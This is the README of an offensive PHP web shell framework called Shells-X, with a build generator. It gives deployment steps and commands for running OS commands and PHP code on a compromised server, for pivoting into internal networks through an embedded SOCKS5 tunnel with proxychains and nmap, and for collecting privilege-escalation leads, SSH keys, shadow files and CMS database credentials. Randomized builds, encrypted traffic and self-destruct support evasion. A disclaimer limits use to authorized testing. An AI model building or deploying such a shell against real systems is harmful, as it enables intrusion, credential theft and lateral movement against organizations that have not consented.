# Shells-X

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Python 3.6+](https://img.shields.io/badge/Python-3.6%2B-blue.svg)](https://www.python.org/)
[![PHP 5.6+](https://img.shields.io/badge/PHP-5.6%2B-777BB4.svg)](https://www.php.net/)
[![Zero Dependencies](https://img.shields.io/badge/Dependencies-Zero-brightgreen.svg)](https://github.com/vektor-x-com/Shells-X)
[![Single File Deploy](https://img.shields.io/badge/Deploy-Single%20File-orange.svg)](https://github.com/vektor-x-com/Shells-X)
[![Platform](https://img.shields.io/badge/Platform-Linux-lightgrey.svg)](https://github.com/vektor-x-com/Shells-X)

A modular, single-file web shell framework with a build generator. Source modules are developed separately — deployment is always one file. Every build gets a unique SHA256 fingerprint.

> **Disclaimer:** This tool is intended for authorized penetration testing, red team operations, CTF competitions, and security research only. Unauthorized access to computer systems is illegal. Always obtain proper authorization before use.

## Features

- **PHP Console** — execute PHP code with error handling, configurable timeout, and fatal error recovery
- **OS Shell** — auto-detected command execution (probes `system`, `exec`, `shell_exec`, `passthru`, `popen`, `proc_open`) with persistent CWD and command history
- **SOCKS5 Tunnel** — embedded [Neo-reGeorg](https://github.com/L-codes/Neo-reGeorg) endpoint for pivoting through the compromised host
- **File Browser** — navigate, download, upload, delete. Shows permissions, owner:group, symlink targets, R/W flags
- **System Diagnostics** — 30+ recon checks for privilege escalation, network pivoting, and credential harvesting (see [Diagnostics](#diagnostics) below)
- **Command History** — persistent history with re-run, export, and IndexedDB storage
- **Auto-Randomized Themes** — every build gets a unique color palette by default, with 6 named presets and custom accent support
- **Traffic Encryption** — AES-256-CBC encrypts all request/response payloads when password protection is enabled, key derived from login password
- **Framework Detection** — auto-detects 15+ CMS/frameworks (WordPress, Laravel, Joomla, Drupal, Symfony, Magento, etc.) with version, DB credentials, debug mode, and admin paths
- **Self-Destruct** — one-click button to permanently delete the shell file from the server, clear sessions, and wipe local data

## Quick Start

```bash
# Default build
python generate.py

# Password-protected with tunnel
python3 neoreg.py -g -k tunnelpass
python generate.py --tunnel neoreg_servers/tunnel.php --password s3cret --minify

# Minimal build
python generate.py --exclude tunnel,diagnostics

# Named color theme
python generate.py --theme ocean

# Custom accent color
python generate.py --accent "#ff6600"

# Verify integrity
python generate.py --verify dist/shell_a3f8c1e2.php
```

Output lands in `dist/`. Deploy the single `.php` file to a web server.

## Generator Options

| Flag | Description |
|------|-------------|
| `--password SECRET` | SHA256 password protection (plaintext never stored) |
| `--tunnel FILE` | Embed Neo-reGeorg tunnel (from `neoreg.py -g`) |
| `--seed STRING` | Operator seed for unique fingerprinting |
| `--minify` | Strip comments, collapse whitespace |
| `--exclude MODULES` | Comma-separated: `tunnel`, `diagnostics`, `history` |
| `--theme NAME` | Color theme: `ocean`, `crimson`, `forest`, `purple`, `mono`, `solar` |
| `--accent COLOR` | Custom accent hex color (e.g. `"#ff6600"`) |
| `--output NAME` | Custom output filename |
| `--verify FILE` | Check integrity of a generated shell |

## SOCKS5 Tunnel & Pivoting

The tunnel embeds a Neo-reGeorg endpoint directly into the shell, creating a SOCKS5 proxy through the compromised host. This lets you use your own tools against the internal network.

### Setup

```bash
# 1. Generate tunnel key
python3 neoreg.py -g -k mypassword

# 2. Build with tunnel embedded
python generate.py --tunnel neoreg_servers/tunnel.php --password shellpass

# 3. Deploy shell, then connect (--skip required for embedded mode)
python3 neoreg.py -u https://target.com/shell.php -k mypassword --skip

# 4. Proxy traffic through the target
proxychains ssh user@10.0.0.5
proxychains mysql -h 10.0.0.3 -u root -p
chromium --proxy-server="socks5://127.0.0.1:1080"
```

### Nmap through the tunnel

Nmap defaults to raw sockets and ICMP which can't traverse SOCKS5. Use these flags:

```bash
# Port scan
proxychains nmap -sT -Pn -n --unprivileged -T3 \
  --max-rtt-timeout 2s --max-retries 1 \
  -p 21,22,80,443,445,3306,3389,5432,6379,8080,8443 10.0.0.0/24

# With service detection (slower)
proxychains nmap -sT -Pn -n --unprivileged -sV -T3 \
  --max-rtt-timeout 2s 10.0.0.1 -p 80,443,3306
```

| Flag | Why |
|------|-----|
| `-sT` | TCP connect scan — only type that works through SOCKS |
| `-Pn` | Skip host discovery — ICMP can't go through SOCKS5 |
| `-n` | No DNS resolution — prevents leaks and assertion errors |
| `--unprivileged` | Disable raw socket operations |
| `-T3` | Normal timing — T4/T5 overwhelm the tunnel |
| `--max-rtt-timeout 2s` | Prevent hangs on slow responses |
| `--max-retries 1` | Don't retry through the slow tunnel |

Optional `proxychains.conf` tuning:
```
tcp_read_time_out 3000
tcp_connect_time_out 3000
```

### What works / doesn't work through SOCKS5

| Works | Doesn't work |
|-------|-------------|
| TCP connect scans (`nmap -sT`) | SYN scans (`nmap -sS`) — raw sockets |
| Service fingerprinting (`nmap -sV`) | UDP scans — SOCKS5 is TCP only |
| HTTP tools (curl, sqlmap, gobuster) | ICMP/ping — raw packets |
| DB clients (mysql, psql, redis-cli) | OS fingerprinting (`nmap -O`) |
| SSH, netcat, socat | Nmap scripts (`-sC`) — most use raw sockets/UDP |
| Chromium/Firefox via SOCKS5 proxy | ARP scanning — Layer 2 |

## Diagnostics

The Diagnostics tab runs 30+ pure-PHP recon checks (no shell execution required). Everything is read from `/proc`, `stat()`, `fileperms()`, and filesystem reads — works even when all exec functions are disabled.

### System & Identity

| Check | What it shows |
|-------|--------------|
| PHP config | Version, disable_functions, open_basedir, allow_url_fopen |
| Process identity | UID, GID, groups, supplementary group memberships |
| Container detection | Docker, Podman, Kubernetes, LXC (via cgroups, /.dockerenv, PID 1) |
| Login users | /etc/passwd users with real shells, UID highlighted |
| Privileged groups | Members of sudo, wheel, docker, lxd, adm, shadow, disk |

### Network

| Check | What it shows |
|-------|--------------|
| Open ports | Listening TCP ports (IPv4+IPv6) with UID and process correlation |
| ARP table | Neighboring hosts with MAC addresses |
| Routing table | Routes with gateway, mask, metric |

### Privilege Escalation

| Check | What it finds | Why it matters |
|-------|--------------|----------------|
| **SUID/SGID binaries** | Setuid/setgid binaries with GTFOBins matching | Direct root escalation if exploitable binary found |
| **Capabilities** | Decoded CapEff/CapBnd with dangerous cap highlighting | CAP_SETUID, CAP_SYS_ADMIN = instant privesc |
| **Cron jobs** | /etc/crontab, cron.d, user crontabs + writable script detection | Writable cron script = code exec as that user |
| **Sudo config** | /etc/sudoers + sudoers.d contents | NOPASSWD entries, runas rules |
| **Docker socket** | /var/run/docker.sock access + docker group check | Writable socket = root equivalent |
| **Mount points** | Filesystem flags: rw, nosuid, noexec | rw + no nosuid = can place/run SUID binaries |
| **Kernel info** | Version, architecture, ASLR status | Kernel version for exploit matching, ASLR off = easier exploitation |
| **Security modules** | SELinux (enforcing/permissive), AppArmor, Seccomp | Permissive/disabled = fewer restrictions on exploits |
| **LD_PRELOAD** | /etc/ld.so.preload writability | Writable = inject shared library into any process |
| **NFS exports** | /etc/exports with no_root_squash detection | no_root_squash = create SUID binaries via NFS |
| **Systemd timers** | Timer + service files, writable ExecStart targets | Writable target script = code exec as service user |

### Credentials & Files

| Check | What it finds |
|-------|--------------|
| Sensitive files | SSH keys (rsa/ed25519/ecdsa), authorized_keys, host keys, shadow, sudoers, bash/zsh history |
| Environment files | .env, .env.local, .env.production across web roots |
| Credential files | .my.cnf, debian.cnf, .pgpass, wp-config.php, database.php/yml |
| Backup files | .bak, .old, .sql, .sql.gz, .swp, .cfg in web roots |
| Writable dirs | /tmp, /dev/shm, /var/tmp, web roots |
| Binary dirs | Readability and writability of /bin, /usr/bin, etc. |

### PHP Execution Analysis

| Check | What it shows |
|-------|--------------|
| Dangerous functions | 18 exec functions + FFI class availability |
| Extensions | FFI, sockets, pcntl, phar, openssl, etc. |
| Indirect vectors | When all direct exec is disabled, shows: mail() -X file write, error_log() type 3 file write, fsockopen() reverse shells, FFI libc calls |
| Interpreters & tools | Available python, perl, ruby, gcc, nmap, curl, wget, socat, etc. |
| Hosting panels | Detects 19+ panels (cPanel, Plesk, aaPanel, CloudPanel, etc.) |

## Theming

Every build automatically gets a unique, randomized color palette — no two shells look the same by default. Colors are derived from a random hue using HSL color space, keeping semantic colors (green/red/yellow for success/error/warning) fixed for usability.

```bash
# Auto-random (default) — unique palette each build
python generate.py

# Deterministic — same seed always produces the same palette
python generate.py --seed "op-nighthawk"

# Named preset
python generate.py --theme crimson

# Preset with accent override
python generate.py --theme mono --accent "#00ff88"
```

Available presets: `ocean`, `crimson`, `forest`, `purple`, `mono`, `solar`

When `--password` is set, the login page also matches the chosen theme.

## Traffic Encryption

When `--password` is set, all request/response payloads are automatically encrypted with AES-256-CBC. The encryption key is derived from the login password (`SHA256(password)`).

- The login form captures the password hash into `sessionStorage` before authenticating
- All subsequent `fetchJSON` calls encrypt the FormData and decrypt the response
- File downloads (GET requests) and file uploads bypass encryption
- If `sessionStorage` is cleared (new tab), the shell prompts for the passphrase
- Requires Web Crypto API (HTTPS or localhost) and PHP OpenSSL extension

No extra flags needed — encryption activates automatically with `--password`.

## Self-Destruct

A button in the sidebar permanently destroys the shell:

1. Sends `action=destruct` → PHP calls `unlink(__FILE__)` + `session_destroy()`
2. JS clears IndexedDB (`shelldb`) and `sessionStorage`
3. Page is replaced with a "Shell destroyed" message

Double confirmation prompt prevents accidental use. Always present regardless of modules or auth.

## Framework Detection

The Diagnostics tab auto-detects CMS and frameworks on the target filesystem using signature files (pure PHP, no shell exec). For each detected framework, it extracts:

- Version number
- Config file path
- Database credentials (host, name, user, password)
- Debug mode status
- Admin panel path
- Plugin/theme counts (WordPress)

Supported: WordPress, Laravel, Joomla, Drupal, Symfony, CodeIgniter, Magento 1/2, PrestaShop, Nextcloud/OwnCloud, phpBB, MediaWiki, Moodle, CakePHP, Yii2

## Build Fingerprint

Every shell embeds a unique `__BUILD` with hash, timestamp, language, version, and operator seed. Visible in Diagnostics > Build Info. Use `--verify` to check integrity.

## Password Protection

```bash
python generate.py --password "hunter2"
```

SHA256 hash embedded — plaintext never stored. Logout via `?logout`.

## Project Structure

```
Webshells/
├── generate.py                  # Build tool (Python 3, zero deps)
├── templates/php.tpl            # Single-file PHP template
├── src/
│   ├── config/defaults.json     # Module definitions
│   ├── backend/php/
│   │   ├── _order.json          # Assembly order
│   │   ├── download.php         # GET file download
│   │   ├── filebrowser.php      # Directory listing
│   │   ├── fileops.php          # Delete + upload
│   │   ├── eval.php             # PHP code execution
│   │   ├── shell.php            # OS command execution
│   │   └── diagnostics.php      # System recon + privesc checks
│   └── frontend/
│       ├── css/shell.css        # Dark theme
│       ├── html/layout.html     # Layout with module markers
│       └── js/                  # core, db, console, shell, tunnel,
│                                # diagnostics, history, filebrowser
└── dist/                        # Generated shells (gitignored)
```

## Keyboard Shortcuts

| Key | Context | Action |
|-----|---------|--------|
| `Ctrl+Enter` | PHP Console | Execute code |
| `Enter` | OS Shell | Execute command |
| `Arrow Up/Down` | OS Shell | Navigate history |
| `Ctrl+L` | OS Shell | Clear output |

## Requirements

- **Generator:** Python 3.6+ (stdlib only)
- **Runtime:** PHP 5.6+ (fsockopen needed for tunnel)
- **Browser:** Any modern browser with IndexedDB

## License

MIT
